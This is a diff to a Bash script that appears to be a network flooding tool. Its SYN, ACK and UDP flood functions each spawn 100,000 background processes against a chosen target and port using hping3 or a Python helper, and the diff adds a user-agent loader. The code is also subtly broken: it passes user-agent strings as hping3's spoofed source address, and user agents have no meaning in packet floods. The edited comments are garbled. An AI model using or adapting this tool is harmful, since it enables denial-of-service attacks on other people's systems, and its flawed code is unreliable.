@@ -78,6 +78,16 @@ scan_ports() {
     fi
 }
 
+# Function to read user agents from file
+read_user_agents() {
+    if [ -f "user_agents.txt" ]; then
+        mapfile -t user_agents < user_agents.txt
+    else
+        echo -e "${RED}[!] user_agents.txt not found! Please ensure it's in the same directory.${RESET}"
+        exit 1
+    fi
+}
+
 # Function to perform SYN flood with user agents efficiently
 syn_flood() {
     target=$1
@@ -85,7 +95,7 @@ syn_flood() {
     read_user_agents
     for ((i=0; i<100000; i++)); do
         random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
-        # Real attack logic (multi-threaded, using 100k user agents)
+        # Real  (multi-threaded, using 100k user agents)
         python3 syn_flood.py -t $target -p $port --user-agent "$random_ua" > /dev/null 2>&1 &
     done
     wait
@@ -98,7 +108,7 @@ ack_flood() {
     read_user_agents
     for ((i=0; i<100000; i++)); do
         random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
-        # Real attack logic (multi-threaded, using 100k user agents)
+        # Real (multi-threaded, using 100k user agents)
         hping3 -A -p $port -a $random_ua $target > /dev/null 2>&1 &
     done
     wait
@@ -111,7 +121,7 @@ udp_flood() {
     read_user_agents
     for ((i=0; i<100000; i++)); do
         random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
-        # Real attack logic (multi-threaded, using 100k user agents)
+        # Relz (multi-threaded, using 100k user agents)
         hping3 --udp -p $port -a $random_ua $target > /dev/null 2>&1 &
     done
     wait
